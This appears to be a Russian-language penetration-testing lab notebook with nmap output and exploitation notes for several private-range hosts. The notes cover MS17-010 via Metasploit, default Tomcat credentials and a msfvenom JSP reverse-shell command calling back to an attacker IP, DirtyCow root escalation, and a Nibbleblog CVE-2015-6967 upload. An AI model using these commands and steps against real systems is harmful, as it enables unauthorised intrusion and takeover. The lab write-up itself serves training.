~~192.168.100.7~~
~~192.168.100.10,192.168.100.16~~
~~192.168.100.11~~
~~192.168.100.12 ~~
~~192.168.100.20~~
~~192.168.100.24~~
192.168.100.9

==192.168.100.7== - Windows 7 with smb
MS17-010
>[!tip]- nmap
>135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: OFFICE-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_nbstat: NetBIOS name: OFFICE-PC, NetBIOS user: unknown, NetBIOS MAC: 00:50:56:a7:1d:99 (VMware)
| smb2-time: 
|   date: 2025-01-16T19:42:24
|_  start_date: 2025-01-15T14:07:32
|_clock-skew: mean: 10h36m02s, deviation: 4h37m07s, median: 7h56m02s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: OFFICE-PC
|   NetBIOS computer name: OFFICE-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-01-16T11:42:24-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Проверяем уязвима ли машина к MS17-010 с помощью nmap --script smb-vuln-ms17-010 192.168.100.7
![](../../../attachment/Pasted%20image%2020250117142216.png)
Запускаем msfconsole и находим ms17-010. Производим минимальную настройку и запускаем. Спустя несколько попыток получаем соединение и забираем флаг с рабочего стола Peter!![](../../../attachment/Pasted%20image%2020250117142413.png)
![](../../../attachment/Pasted%20image%2020250117142431.png)




==192.168.100.12== - tomcat
Заходим на сайт  http://192.168.100.12:8080 и видим что tomcat только что был установлен. Скорее всего пароль остался дефолтным. Перебираем стандартные пароли tomcat и получает доступ (tomcat s3cret)
![](../../../attachment/Pasted%20image%2020250113113119.png)

Создаем шелл `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 -f war > shell.war`
и затем заливаем его на сайт и переходим http://192.168.100.12:8080/shell/
Получаем подключение и забираем первый флаг пользователя 

python -c "import pty; pty.spawn('/bin/bash')"

Закидываем на машину DirtyCow и компилируем файл ( О DirtyCow можно узнать с помощью linpeas ил)
![](../../../attachment/Pasted%20image%2020250117215741.png)
Запускаем его и создаем нового пользователя root с паролем hacker
![](../../../attachment/Pasted%20image%2020250117215833.png)
Заходим под новым пользователем и забираем флаг




==192.168.100.10,16==
>[!tip]- nmap
>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 7h55m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-17T20:11:29
|_  start_date: N/A
Nmap scan report for 192.168.100.16
Host is up (0.034s latency).
Not shown: 65349 closed tcp ports (conn-refused), 160 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-17 20:09:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tech.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: TECH)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tech.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: TECH
|   NetBIOS_Domain_Name: TECH
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: tech.local
|   DNS_Computer_Name: DC01.tech.local
|   DNS_Tree_Name: tech.local
|   Product_Version: 10.0.14393
|_  System_Time: 2025-01-17T20:12:30+00:00
|_ssl-date: 2025-01-17T20:12:49+00:00; +7h56m04s from scanner time.
| ssl-cert: Subject: commonName=DC01.tech.local
| Not valid before: 2025-01-14T23:26:15
|_Not valid after:  2025-07-16T23:26:15
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: DC01
|   NetBIOS computer name: DC01\x00
|   Domain name: tech.local
|   Forest name: tech.local
|   FQDN: DC01.tech.local
|_  System time: 2025-01-17T12:12:39-08:00
| smb2-time: 
|   date: 2025-01-17T20:12:38
|_  start_date: 2025-01-15T23:26:24
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 9h32m05s, deviation: 3h34m44s, median: 7h56m03s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required



==192.168.100.24==
Через ffuf находим страницы admin и update
![](../../../attachment/Pasted%20image%2020250117192249.png)

На странице admin подбираем пароль и логин (admin admin) и получаем доступ к кабинету админа
На странице update узнаем версию Nibbleblog 4.0.3
![](../../../attachment/Pasted%20image%2020250117192400.png)
Воспользуемся  CVE-2015-6967 которая загружает наш payload php по адресу content/private/plugins/my_image/image.php
![](../../../attachment/Pasted%20image%2020250117192554.png)

И получаем страницу со строкой для команд в которой прописываем shell 
![](../../../attachment/Pasted%20image%2020250117192650.png)

Получаем доступ, делаем стабильный шелл и получаем первый флаг user 


![](../../../attachment/Pasted%20image%2020250117192814.png)

Проверяем sudo и видим что можем использовать sudo без пароля. Читаем флаг в директории root 

![](../../../attachment/Pasted%20image%2020250117192906.png)


==192.168.100.20==

 проверяем наличие уязвимости nmap --script smb-vuln-ms17-010 192.168.100.20
 ![](../../../attachment/Pasted%20image%2020250117200933.png)

  через msfconsole запускаем ms17-010 psexec и получаем доступ под системой
![](../../../attachment/Pasted%20image%2020250117201010.png)

Находим файл через search -f *.txt и забираем флаг



==192.168.100.9==
admin/dcerpc/cve_2020_1472_zerologon

==192.168.100.11==